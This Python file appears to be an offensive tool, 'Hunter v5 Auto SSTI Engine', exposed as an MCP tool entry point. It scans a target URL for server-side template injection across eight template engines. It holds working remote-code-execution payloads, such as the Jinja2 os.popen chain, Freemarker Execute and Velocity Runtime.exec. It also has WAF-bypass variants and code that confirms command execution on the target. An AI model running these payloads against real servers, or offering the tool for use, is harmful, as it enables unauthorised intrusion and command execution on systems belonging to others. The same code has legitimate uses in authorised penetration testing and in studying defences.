"""
Hunter v5 — Auto SSTI Engine

Automates Server-Side Template Injection detection:
1. Multi-engine detection (Jinja2, Freemarker, ERB, Velocity, Twig, Thymeleaf, Smarty)
2. Expression evaluation confirmation
3. RCE verification
4. WAF bypass variants
"""

import re
import time
try:
    from tools.probe import _get_session
except (ImportError, ModuleNotFoundError):
    import requests
    def _get_session():
        s = requests.Session()
        s.verify = False
        s.headers.update({'User-Agent': 'Mozilla/5.0'})
        return s


class AutoSSTI:
    """Automated SSTI detection engine."""

    def __init__(self, base_url: str, param: str = "q",
                 method: str = "GET", session=None):
        self.base_url = base_url
        self.param = param
        self.method = method.upper()
        self.session = session or _get_session()
        self.vulnerable = False
        self.engine = None
        self.working_payload = None
        self.findings = []

    def _send(self, payload: str) -> dict:
        """Send payload and return response."""
        try:
            if self.method == "GET":
                from urllib.parse import quote
                url = f"{self.base_url}?{self.param}={quote(payload)}"
                resp = self.session.get(url, timeout=10, allow_redirects=False)
            else:
                resp = self.session.post(self.base_url,
                                         data={self.param: payload},
                                         timeout=10, allow_redirects=False)
            return {
                "status": resp.status_code,
                "body": resp.text,
                "length": len(resp.text),
            }
        except Exception as e:
            return {"status": 0, "body": "", "error": str(e)}

    def _get_baseline(self) -> dict:
        """Get baseline response for comparison."""
        marker = "HUNTER_SSTI_BASELINE_7392"
        return self._send(marker)

    def detect_math_expressions(self) -> dict:
        """Test if math expressions are evaluated server-side."""
        baseline = self._get_baseline()
        base_len = len(baseline.get("body", ""))

        # Math expression payloads grouped by engine
        engines = {
            "jinja2/twig": {
                "payload": "{{7*7}}",
                "expected": "49",
                "rce_payload": "{{config}}",
                "rce_indicators": ["SECRET_KEY", "SESSION", "CONFIG"],
            },
            "freemarker": {
                "payload": "${7*7}",
                "expected": "49",
                "rce_payload": "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
                "rce_indicators": ["uid=", "root"],
            },
            "erb/ruby": {
                "payload": "<%= 7*7 %>",
                "expected": "49",
                "rce_payload": "<%= system('id') %>",
                "rce_indicators": ["uid=", "root"],
            },
            "velocity": {
                "payload": "#set($x = 7 * 7)${x}",
                "expected": "49",
                "rce_payload": "#set($rt=$x.getRuntime())#set($proc=$rt.exec('id'))$proc",
                "rce_indicators": ["uid=", "root"],
            },
            "thymeleaf": {
                "payload": "__${7*7}__",
                "expected": "49",
                "rce_payload": "${T(java.lang.Runtime).getRuntime().exec('id')}",
                "rce_indicators": ["uid=", "root", "Process"],
            },
            "smarty": {
                "payload": "{7*7}",
                "expected": "49",
                "rce_payload": "{php}echo `id`;{/php}",
                "rce_indicators": ["uid=", "root"],
            },
            "mako": {
                "payload": "${7*7}",
                "expected": "49",
                "rce_payload": "<% import os %>${os.popen('id').read()}",
                "rce_indicators": ["uid=", "root"],
            },
        }

        results = []
        for engine_name, config in engines.items():
            result = self._send(config["payload"])
            body = result.get("body", "")

            # Check if math expression was evaluated
            if config["expected"] in body:
                self.vulnerable = True
                self.engine = engine_name
                self.working_payload = config["payload"]

                # Try RCE verification
                rce_result = self._send(config["rce_payload"])
                rce_body = rce_result.get("body", "")
                rce_confirmed = any(ind in rce_body for ind in config["rce_indicators"])

                self.findings.append({
                    "type": "ssti",
                    "engine": engine_name,
                    "detection_payload": config["payload"],
                    "rce_payload": config["rce_payload"],
                    "rce_confirmed": rce_confirmed,
                    "severity": "critical" if rce_confirmed else "high",
                })

                results.append({
                    "engine": engine_name,
                    "vulnerable": True,
                    "rce_confirmed": rce_confirmed,
                    "payload": config["payload"],
                })
                break  # Found the engine, stop
            else:
                results.append({
                    "engine": engine_name,
                    "vulnerable": False,
                })

        return {
            "tested": len(results),
            "vulnerable": self.vulnerable,
            "engine": self.engine,
            "results": results,
        }

    def test_waf_bypass(self) -> dict:
        """Test WAF bypass variants if standard payloads are blocked."""
        if self.vulnerable:
            return {"skipped": True, "reason": "Already found vulnerable"}

        bypass_payloads = [
            ("jinja2_spacing", "{{ 7*7 }}"),
            ("jinja2_newline", "{{\n7*7\n}}"),
            ("jinja2_comment", "{# comment #}{{7*7}}"),
            ("freemarker_paren", "${(7*7)}"),
            ("erb_space", "<%=  7*7  %>"),
            ("expression_concat", "{{7*\"7\"}}"),
            ("twig_attr", "{{attribute(7,'*',7)}}"),
        ]

        results = []
        for name, payload in bypass_payloads:
            result = self._send(payload)
            if "49" in result.get("body", ""):
                self.vulnerable = True
                self.working_payload = payload
                self.findings.append({
                    "type": "ssti_bypass",
                    "payload": payload,
                    "technique": name,
                    "severity": "critical",
                })
                results.append({"technique": name, "vulnerable": True, "payload": payload})
                break
            results.append({"technique": name, "vulnerable": False})

        return {"tested": len(results), "results": results}

    def disambiguate_jinja2_twig(self) -> str:
        """Distinguish Jinja2 from Twig using {{7*'7'}} trick.

        Returns: 'jinja2' (7777777) or 'twig' (49) or 'unknown'
        """
        result = self._send("{{7*'7'}}")
        body = result.get("body", "")

        if "7777777" in body:
            self.engine = "jinja2"
            return "jinja2"
        elif "49" in body:
            self.engine = "twig"
            return "twig"

        return "unknown"

    def get_rce_payload(self, engine: str = "") -> dict:
        """Get RCE payload for identified template engine.

        Args:
            engine: Template engine name (auto-detected if empty)
        """
        engine = engine or self.engine

        rce_payloads = {
            "jinja2": {
                "payload": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
                "description": "Jinja2 RCE via config object MRO chain",
            },
            "twig": {
                "payload": "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
                "description": "Twig RCE via undefined filter callback",
            },
            "erb": {
                "payload": "<%=`id`%>",
                "description": "ERB RCE via backtick execution",
            },
            "freemarker": {
                "payload": "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
                "description": "Freemarker RCE via Execute utility",
            },
            "velocity": {
                "payload": "#set($str=$class.inspect('java.lang.String'))#set($chr=$class.inspect('java.lang.Character'))#set($ex=$class.inspect('java.lang.Runtime').getRuntime().exec('id'))",
                "description": "Velocity RCE via Runtime.exec",
            },
        }

        if engine in rce_payloads:
            return rce_payloads[engine]

        return {"error": f"Unknown engine: {engine}", "available": list(rce_payloads.keys())}

    def run_full_scan(self) -> dict:
        """Run complete automated SSTI scan."""
        start = time.time()
        results = {"target": self.base_url, "param": self.param, "steps": []}

        # Step 1: Math expression detection
        math_result = self.detect_math_expressions()
        results["math_detection"] = math_result
        results["steps"].append({"step": "math_detection", "result": math_result})

        # Step 2: WAF bypass (if not found yet)
        if not self.vulnerable:
            bypass_result = self.test_waf_bypass()
            results["waf_bypass"] = bypass_result
            results["steps"].append({"step": "waf_bypass", "result": bypass_result})

        results["vulnerable"] = self.vulnerable
        results["engine"] = self.engine
        results["working_payload"] = self.working_payload
        results["findings"] = self.findings
        results["elapsed_ms"] = int((time.time() - start) * 1000)

        return results


def auto_ssti_impl(base_url: str, param: str = "q", method: str = "GET") -> dict:
    """Run automated SSTI scan. Entry point for MCP tool."""
    engine = AutoSSTI(base_url, param, method)
    return engine.run_full_scan()
